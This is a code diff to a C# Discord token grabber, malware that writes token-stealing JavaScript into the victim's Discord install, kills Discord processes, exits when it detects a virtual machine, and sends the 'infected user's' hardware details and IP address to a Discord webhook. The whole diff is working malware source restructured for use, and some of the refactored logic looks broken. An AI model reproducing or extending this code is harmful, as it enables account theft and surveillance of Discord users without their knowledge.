@@ -34,29 +34,23 @@ namespace Furious
 			return false;
 		}
 
-		public static async Task QuickStart(bool injectJS = false, bool grabIP = false, bool grabHardware = false, bool checkForVM = false)
+		///This method allows the user to choose to customise the grabber, whether they want to inject the token grabbing code, get the infected user's hardware information, and choose to check for a virtual machine.
+		public static async Task QuickStart(bool injectJS = false, bool getUserHardware = false, bool checkForVM = false)
 		{
-			///This method allows the user to customise what data is collected, whether they want to inject the token grabbing code, and choose to check for a virtual machine.
 			if (checkForVM)
-			{
+			{ 
 				if (UsingVM())
-				{
 					Environment.Exit(0);
-				}
 			}
 			if (injectJS)
-				await InjectJS();
-			if (grabIP)
-				await SendData(await GrabIP());
-			if (grabHardware)
+				CloseProcesses();
+			if (getUserHardware)
 				await SendData(await GetHardware());
 		}
 
+		///This method is used to write the token grabbing JavaScript code into the Discord directory.
 		public static async Task InjectJS()
         {
-			///This method is used to write the token grabbing JavaScript code into the Discord directory.
-			CloseProcesses();
-
 			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord"))
 			{
 				string[] discord = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord");
@@ -98,22 +92,25 @@ namespace Furious
 			}
 		}
 
+		///Closes all processes which contain "discord" in their name before writing the JS.
 		private static void CloseProcesses()
 		{
-			///Closes all processes which contain "discord" in their name.
 			foreach (Process process in Process.GetProcesses())
 			{
 				if (process.ProcessName.ToLower().Contains("discord"))
 				{
 					process.Kill();
-					process.WaitForExit();
+					process.Exited += async (a, e) =>
+					{
+						await InjectJS();
+					};
 				}
 			}
 		}
 
+		///This method collects the users hardware specifications which can be sent to a webhook using the SendData method.
 		public static async Task<string> GetHardware()
 		{
-			///This method collects the users hardware specifications which can be sent to a webhook using the SendData method.
 			StringBuilder sb = new StringBuilder();
 
 			await Task.Run(() =>
@@ -136,15 +133,9 @@ namespace Furious
 			return sb.ToString();
 		}
 
-		private static async Task<string> GrabIP()
-		{
-			///This method collects the users IP address which can be sent to a webhook using the SendData method.
-			return await new WebClient().DownloadStringTaskAsync("https://ipv4.icanhazip.com");
-		}
-
+		///This method sends the data the paramater holds to a specified Discord webhook.
 		public static async Task<HttpResponseMessage> SendData(string data)
 		{
-			///This method sends the data the paramater holds to a specified Discord webhook.
 			string hook = "webhook-here";
 			
 			HttpResponseMessage response = null;
@@ -164,6 +155,10 @@ namespace Furious
 					Debug.WriteLine(ex.Message);
 				}
 			}
+
+			///This inherited method obtains the users IP address which will be sent to the specified webhook.
+			async Task<string> GrabIP() => await new WebClient().DownloadStringTaskAsync("https://ipv4.icanhazip.com");
+
 			return response;
 		}
 	}
